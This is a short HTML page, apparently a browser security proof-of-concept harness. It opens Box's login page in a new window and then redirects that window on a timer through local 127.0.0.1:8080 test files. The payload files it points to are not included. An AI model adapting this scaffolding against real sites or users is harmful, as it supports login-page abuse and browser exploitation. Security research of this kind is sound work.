<!DOCTYPE html>
<html>
<div id="log1"></div>
<button onclick="openAndRedirect(url_arr,1000)">open1</button>
<button onclick="openAndRedirect(url_arr2,1000)">open2</button>
<script>
    url_arr = ['https://account.box.com/login', `http://127.0.0.1:8080/${Date.now()}`, 'http://127.0.0.1:8080/asd.js', `http://127.0.0.1:8080/${Date.now()}`, 'http://127.0.0.1:8080/sbx.html'];
    url_arr2 = ['https://account.box.com/login', 'http://127.0.0.1:8080'];
    function openAndRedirect(urls, delay) {
        delay = delay || 1000;
        var nw = window.open(urls[0], '_blank');
        if (!nw) return null;
        for (var i = 1; i < urls.length; i++) {
            (function (url, t) {
                setTimeout(function () {
                    if (!nw.closed) nw.location.href = url;
                }, t);
            })(urls[i], i * delay);
        }
        return nw;
    }

    // openAndRedirect([url1, url2, url3, url4]);
</script>
</html>
